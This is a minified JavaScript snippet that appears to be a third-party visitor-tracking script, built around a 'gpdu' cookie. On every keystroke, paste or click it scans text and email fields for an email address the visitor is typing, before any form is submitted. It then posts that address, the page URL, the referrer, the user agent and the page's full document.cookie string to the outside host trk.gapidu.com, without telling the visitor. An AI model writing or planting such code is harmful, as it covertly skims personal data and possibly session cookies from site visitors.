!function(){var a={gpdu:{cookieHandler:function(c){var d,e=window.gpdu.tid,f=Math.round(+new Date/1e3),g=b.general.generateUUID(),h=b.cookies.getCookie("gpdu"),i=h?h.split(":"):"",c=!0,j=null;if(h)if(a.gpdu.checkIfNewSession(i[1])){var k=Number(i[2])+1;d=i[0]+":"+f+":"+k}else c=!1,d=i[0]+":"+f+":"+i[2],b.cookies.setCookie("gpdu",d);else d=e+"-"+g+":"+f+":1";try{j=b.email.find()}catch(a){}if(null==j)try{j=i[3]}catch(a){j=null}var l={newSession:c,email:j,cookie:d};return l},checkIfNewSession:function(a){var b=30,c=Math.round(+new Date/1e3),d=Number(((c-a)/60).toFixed(0));return d>b},sessionsCount:function(a){var b=a.split(":");try{return Number(b[2])}catch(a){return 0}}}},b={cookies:{getCookie:function(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return!1},setCookie:function(a,b){if("undefined"!=b&&"undefined"!=typeof b){var c=new Date;c.setTime(c.getTime()+63072e6);var d="expires="+c.toUTCString(),e=function(){var a=location.hostname.split(".").reverse();return 1==a.length?"domain="+location.hostname.split(".").reverse()[0]:"domain=."+location.hostname.split(".").reverse()[1]+"."+location.hostname.split(".").reverse()[0]},f=a+"="+b+";"+e()+"; "+d+"; path=/";document.cookie=f}}},general:{generateUUID:function(){var a=(new Date).getTime(),b="xxxxxxxxxxxxxxxxxxxx".replace(/[xy]/g,function(b){var c=(a+16*Math.random())%16|0;return a=Math.floor(a/16),("x"==b?c:3&c|8).toString(16)});return b},checkIfBot:function(){return/bot|google|aolbuild|baidu|bing|msn|duckduckgo|teoma|slurp|yandex/i.test(navigator.userAgent)}},server:{post:function(a){if(!b.general.checkIfBot()){var c={};a.newSession&&(c=b.server.collectIds()),null!=a.email&&(c.email=a.email),c.vid=a.cookie.split(":")[0],c.tid=c.vid.split("-")[0],xmlhttp=new XMLHttpRequest;var d="https://trk.gapidu.com/gapidu";xmlhttp.timeout=2e3,xmlhttp.open("POST",d,!0),xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status&&b.cookies.setCookie("gpdu",a.cookie)};var e=Object.keys(c).map(function(a){return encodeURIComponent(a)+"="+encodeURIComponent(c[a])}).join("&");xmlhttp.send(e)}},collectIds:function(){var a={};try{a.referrer=document.referrer,a.url=location.href,a.cookies=document.cookie}catch(a){return}try{a.userAgent=navigator.userAgent}catch(a){}return a}},email:{isEmail:function(a){return a.match(/@.*\./)},find:function(){for(var a=document.querySelectorAll("input[type=text] ,input[type=email]"),c=0;c<a.length;c++){var d=a[c].value;if(b.email.isEmail(d))return d}return null},storeInCookies:function(a){var c=b.cookies.getCookie("gpdu").split(":"),d=c[0]+":"+c[1]+":"+c[2]+":"+a;b.cookies.setCookie("gpdu",d)}}},c={init:function(){c.inputFields()},inputFields:function(){var a=["change","keyup","paste","input","click"];for(event in a){var c=a[event];document.addEventListener(c,function(){try{var a=b.email.find();null!=a&&b.email.storeInCookies(a)}catch(a){}})}},forms:function(){}},d=function(){setTimeout(function(){var d=a.gpdu.cookieHandler();(d.newSession||null!=d.email)&&b.server.post(d),c.init()},3e3)};"complete"===document.readyState?d():window.onload=d()}();